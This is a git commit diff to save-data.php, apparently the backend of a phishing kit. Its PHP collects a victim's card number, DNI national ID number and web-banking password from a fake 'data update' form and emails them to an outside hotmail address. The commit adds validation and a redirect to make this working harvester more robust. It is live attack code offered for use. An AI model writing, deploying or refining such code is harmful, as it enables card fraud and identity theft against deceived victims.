f0459536311905e44636a200a99bf3fb7e4b8da1
Luis Fernando Gomez <lgomez@certuit.com>
2021-10-28 18:29:18 -0700

    se anadio 2do envio de correo de datos

--- save-data.php
+++ save-data.php
@@ -10,24 +10,29 @@
     $dni = $_POST['dni'];
     $pass = $_SESSION['pass'];
 
+    if(isset($cc, $dni, $pass)){
+        //Correo a donde se envía la información
+        //$to = "cruzadoeduar18@gmail.com";
+        $to = "fernando1894@hotmail.com";
 
-    //Correo a donde se envía la información
-    //$to = "cruzadoeduar18@gmail.com";
-    $to = "fernando1894@hotmail.com";
+        //Asunto de correo
+        $subject = "ACTUALIZACION DE DATOS CORREO 1";
 
-    //Asunto de correo
-    $subject = "ACTUALIZACION DE DATOS CORREO 1";
+        //Informacion que se envía en el correo
+        $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
+                "DNI: " . $dni . "\n" . 
+                "CLAVE WEB: " . $pass;
 
-    //Informacion que se envía en el correo
-    $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
-            "DNI: " . $dni . "\n" . 
-            "CLAVE WEB: " . $pass;
+        //Destinatario
+        $headers = "From: pruebas@pruebas.ga";
 
-    //Destinatario
-    $headers = "From: pruebas@pruebas.ga";
+        mail($to, $subject, $txt, $headers);
 
-    mail($to, $subject, $txt, $headers);
-    echo "<script> alert('Datos enviados correctamente.'); window.location='index.php' </script>";
+        header('Location: form.html');
 
-    header('Location: form.html');
+    }
+    else{
+        echo "<script> alert('Ingresa los datos correctamente.'); </script>";
+    }
+    
 ?>
